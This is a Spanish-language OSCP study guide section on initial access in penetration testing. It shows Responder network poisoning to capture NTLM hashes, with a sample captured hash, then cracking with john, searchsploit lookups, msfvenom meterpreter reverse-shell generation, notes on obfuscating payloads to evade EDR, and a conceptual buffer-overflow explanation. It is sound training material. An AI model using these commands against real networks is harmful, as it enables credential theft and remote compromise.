# INITIAL ACCESS:
Despues de tener un panorama por el reconocimiento y por el contexto de un escaneo de vulnerabilidades, en base a la experiencia podemos comenzar a identificar vias de acceso iniciales.

## CAPTURA DE CONTRASEÑAS:
Una de las primeras etapas es ponernos a escuchar para ver sí podemos capturar paquetes de autenticación donde podamos buscar contraseñas o información que nos ayude en los accesos iniciales.

### RESPONDER:
Herramienta que permite capturar request que nos lleguen a nuestra IP; ya sea por request directo o porque envenenamos la red.

Responder permite envenenar servicios de:
- LLMNR (Link-Local Multicast Name Resolution):
  - Protocolo de resulución de nombres multicast, permite resolver nombres cuando no hay presencia de un DNS, a traves de ipv4 e ipv6 envia paquetes de multicast para encontrar al dispositivo.
  - Su debilidad es que como el paquete viaja por todo multicast nosotros podriamos capturarlo y decir que a quien busca somos nosotros.
- NBT-NS (NetBIOS Name Service):
  - Protocolo de resolución de nombres por brodcast, donde se envia la busqueda de nombres tipo netbios por la red, con el objetivo de cuando se envie un paquete nosotros responder que somos nosotros, que nos envie la información.
- MDNS (Multicast DNS):
  - Protocolo multicast de DNS, usado cuando no existe un servidor de DNS centralizado, mismo problema que los anteriores, podemos enviar paquetes diciendo que somos a quien busca que nos envie la información.
- Versiones nuevas tambien permiten envenenar DNS y DHCP.

La practica más sencilla es abrir responder con la configuración por defecto:
```
> responder -I eth0
```
![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-1.png)

En un explorar de archivos escribe lo siguiente, es decir busca un recurso compartido que no exista:
![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-smb1.png)

Podemos hacer lo mismo en un explorar web con un dominio que no exista:
![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-web.png)

Mismo con un recurso por RDP con un dominio que no exista:
![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-rdp.png)

Despues sí ingresamos credenciales o por defecto se envian por el equipo ya sea porque es un servicio o una tarea programada las veremos reflejadas y almacenadas en formato de hashes.

![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-web2.png)

![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-smb.png)

Despues podemos leer el historial de responder y parsear los datos por dia y solo los hashes para poder tratar de desencriptarlos.

```
> cat /usr/share/responder/logs/Responder-Session.log | grep 07/11/2024 | grep NTLM | grep hash | cut -d ":" -f 4-10
```

Lo cual regresara información en este formato:
```
hola2::.:60195920d2a4b827:AC3C88755EC9F5197B96E6243F853CB6:01010000000000003269E66C4CD3DA0100FF684640F8FCD70000000002000800410039003200460001001E00570049004E002D0043005600540049004600300054005300310057004D0004003400570049004E002D0043005600540049004600300054005300310057004D002E0041003900320046002E004C004F00430041004C000300140041003900320046002E004C004F00430041004C000500140041003900320046002E004C004F00430041004C0008003000300000000000000001000000002000007BD31EEEB9164BF1A193AA3D449F0F715B8B287C37A13D5B0DDD1213F667B6990A00100000000000000000000000000000000000090016005400450052004D005300520056002F006100730064000000000000000000
```

La cual podemos pasarle a john para que trate de reversear el hash, y sí la contraseña es debil facilmente la encontrara, sino pasara a modo incremental.
![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/john1.png)

Hay más opciones de crackeo como hashcat y grafico l0phtCrack pero este ultimo no es tan comun.

## Busqueda manual de vulnerabilidades:
Ya que tengamos un reconocimiento tendremos muchas versiones, el tema es que tipicamente aunque la versión sea vulnerable el escaner de vulns no siempre te reporta el hallazgo, por lo que siempre hay que buscar manualmente las versiones para ver que CVE tiene ya asociados.

### EXPLOITDB:
Para esto nos podemos ayudar en la base de datos de ExploitDB, la cual acumula los cve y exploits del respectivo CVE.

- https://www.exploit-db.com/

O traves de kali con searchsploit:
```
> searchsploit Redis
```

## Creación de payloads:
Un tema tambien vital dentro del hacking es la creación de un malware especial llamado reverseshell, hoy en día con el incremento del uso de herramientas tipo EDR y EPP más sofisticadas muchas herramientas de creación de malware han quedado obsoletas, pero... eso no quita que nos sirvan como base para crear el programa que despues nosotros podamos ofuscar (es el arte de encriptar, ocultar, comprimir codigo para evadir controles).

### MSFCONSOLE:
Es la herramienta más sencilla y conocida para la creación de payloads, permite crear archivos elf, exe, incluso apk. Una guia con los más comunes la podemos encontrar en:

- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

La estructura más basica es:
```
msfvenom -p (tipo de payload) LHOST=(IP Address - Listener) LPORT=(Your Port - Listener) -f (extensión) > nombrefichero.extension
```

Por ejemplo, una reverse shell de meterpreter para windows (spoiler: osfuscar una sesión de meterpreter es muy dificil lo comun es shell genericas, a menos claro audites un sistema sin protección de antimalware, sistema antiguo de windows o sistemas linux):
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```

### Payloads en codigo interpretado:
Tambien podemos crear en base a codigo no compliado por ejemplo powershell, php, bash, etc. Esto claro dependera del servicio a explotar, una buena guia con tipicos payloads es:

- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Explotar servicios:
Despues de haber dectado versiones de los servicios, correlacionado la versión con el CVE y su exploit, hashes, o incluso haber desecriptado usuarios podemos pasar a ya directamente interacturar con servicios.

### Buffer overflow:
Ocurre cuando un programa escribe más datos en un buffer de los que este puede manejar, permitiendo a un atacante sobrescribir la memoria adyacente y potencialmente ejecutar código malicioso. Este tipo de vulnerabilidad puede llevar a la corrupción de datos, caídas del programa y compromisos de seguridad.

Por ejemplo, tienen una caja de comentarios donde envias datos y lo recibe la variable "comentarios" pero esa variable solo fue creada para soportar 100 letras ¿Que pasa sí llegan 101? En algunos casos sobreescribiras variables que esten a los lados, esto permitiria alterar el estado y flujo porque la variable del lado ya no esta con el valor esperado.













.
